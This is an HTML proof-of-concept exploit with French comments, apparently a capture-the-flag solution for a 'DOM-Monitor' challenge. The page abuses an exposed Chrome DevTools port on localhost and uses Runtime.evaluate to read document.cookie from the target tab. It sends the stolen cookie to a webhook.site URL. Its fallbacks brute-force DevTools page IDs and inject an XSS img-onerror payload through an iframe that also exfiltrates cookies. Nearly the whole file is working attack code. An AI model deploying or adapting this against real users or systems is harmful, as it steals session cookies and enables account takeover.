<!--  index.html  -->
<!doctype html>
<title>DOM‑Monitor PoC</title>

<button id="start">start</button>
<div id="output" style="white-space: pre; font-family: monospace;"></div>

<script>
(async () => {
  // Fonction pour logger
  function log(msg) {
    console.log(msg);
    const output = document.getElementById('output');
    const line = document.createElement('div');
    line.textContent = msg;
    output.appendChild(line);
  }

  /* L'URL reçue par le bot sera http://votre.site/index.html#<PORT> */
  const port = location.hash.slice(1);
  log(`Port DevTools détecté: ${port}`);
  
  /* Le bot clique sur #start → notre code part à l'exécution */
  document.getElementById('start').onclick = async () => {
    log("Bouton start cliqué, lancement de l'exploit...");

    try {
      /* 1. Récupérer la liste des cibles ouvertes */
      log(`Tentative de récupération des cibles sur http://127.0.0.1:${port}/json/list`);
      let targets;
      try {
        targets = await (await fetch(`http://127.0.0.1:${port}/json/list`)).json();
        log(`Cibles récupérées: ${targets.length}`);
      } catch (e) {
        log(`Erreur récupération des cibles: ${e.message}`);
        // Essayons une autre approche avec WebSocket directs
        tryDirectWebSockets(port);
        return;
      }

      const appTab = targets.find(t => t.url.startsWith('http://app.dom-monitor.fr'));
      if (!appTab) {
        log("Onglet app.dom-monitor.fr non trouvé, essai avec des IDs directs");
        tryDirectWebSockets(port);
        return;
      }

      log(`Onglet cible trouvé: ${appTab.url}`);

      /* 2. Ouvrir la connexion DevTools de cet onglet */
      log(`Connexion au WebSocket: ${appTab.webSocketDebuggerUrl}`);
      const ws = new WebSocket(appTab.webSocketDebuggerUrl);

      ws.onopen = () => {
        /* 3. Évaluer du JS dans le contexte de l'onglet */
        log("WebSocket ouvert, exécution de document.cookie");
        ws.send(JSON.stringify({
          id: 42,
          method: "Runtime.evaluate",
          params: { expression: "document.cookie" }
        }));
      };

      /* 4. Quand la réponse arrive, on exfiltre */
      ws.onmessage = ({data}) => {
        log(`Message reçu: ${data}`);
        const msg = JSON.parse(data);
        if (msg.id === 42 && msg.result && msg.result.result) {
          const cookie = msg.result.result.value;
          log(`COOKIE TROUVÉ: ${cookie}`);
          
          // Exfiltrer via webhook
          fetch("https://webhook.site/b0481fed-9c26-4d29-a054-60ae0e3eae1d?c=" +
                encodeURIComponent(cookie));
                
          // Afficher en grand dans la page
          const flag = document.createElement('div');
          flag.style.fontSize = '24px';
          flag.style.color = 'red';
          flag.style.fontWeight = 'bold';
          flag.textContent = `FLAG: ${cookie}`;
          document.body.appendChild(flag);
        }
      };

      ws.onerror = (e) => {
        log(`Erreur WebSocket: ${e}`);
        // Essayer l'approche alternative
        tryDirectWebSockets(port);
      };
    } catch (e) {
      log(`Erreur globale: ${e.message}`);
      tryDirectWebSockets(port);
    }
  };
  
  // Fonction pour essayer une connexion directe à des WebSockets
  function tryDirectWebSockets(port) {
    log("Tentative de connexion directe à des WebSockets...");
    
    // IDs courants pour les onglets
    const targetIds = ["1", "2", "3", "4", "5"];
    
    targetIds.forEach(id => {
      const wsUrl = `ws://127.0.0.1:${port}/devtools/page/${id}`;
      log(`Essai de connexion à ${wsUrl}`);
      
      try {
        const ws = new WebSocket(wsUrl);
        
        ws.onopen = () => {
          log(`WebSocket ouvert pour ID: ${id}`);
          
          // Test pour voir si c'est le bon onglet
          ws.send(JSON.stringify({
            id: 1,
            method: "Runtime.evaluate",
            params: { expression: "window.location.href" }
          }));
          
          // Récupérer les cookies
          ws.send(JSON.stringify({
            id: 2,
            method: "Runtime.evaluate",
            params: { expression: "document.cookie" }
          }));
        };
        
        ws.onmessage = ({data}) => {
          log(`Message reçu de ${id}: ${data}`);
          const msg = JSON.parse(data);
          
          // Si on a l'URL
          if (msg.id === 1 && msg.result && msg.result.result && msg.result.result.value) {
            const url = msg.result.result.value;
            log(`URL de l'onglet ${id}: ${url}`);
          }
          
          // Si on a le cookie
          if (msg.id === 2 && msg.result && msg.result.result && msg.result.result.value) {
            const cookie = msg.result.result.value;
            log(`COOKIE TROUVÉ dans ${id}: ${cookie}`);
            
            // Exfiltrer via webhook
            fetch("https://webhook.site/b0481fed-9c26-4d29-a054-60ae0e3eae1d?c=" +
                  encodeURIComponent(cookie));
                  
            // Afficher en grand dans la page
            const flag = document.createElement('div');
            flag.style.fontSize = '24px';
            flag.style.color = 'red';
            flag.style.fontWeight = 'bold';
            flag.textContent = `FLAG: ${cookie}`;
            document.body.appendChild(flag);
          }
        };
        
        ws.onerror = (e) => {
          log(`Erreur WebSocket pour ${id}`);
        };
      } catch (e) {
        log(`Erreur lors de la création du WebSocket pour ${id}: ${e.message}`);
      }
    });
    
    // Alternative fallback - essayer simple iframe avec XSS
    log("Tentative avec XSS simple...");
    
    const webhookUrl = "https://webhook.site/b0481fed-9c26-4d29-a054-60ae0e3eae1d";
    const xssPayload = encodeURIComponent(`<img src='x' onerror='fetch("${webhookUrl}?xss-cookie=" + encodeURIComponent(document.cookie))'>`);
    
    const iframe = document.createElement('iframe');
    iframe.src = `https://dom-monitor.fcsc.fr/?content=${xssPayload}`;
    iframe.style.width = '100%';
    iframe.style.height = '100px';
    document.body.appendChild(iframe);
  }
})();
</script>

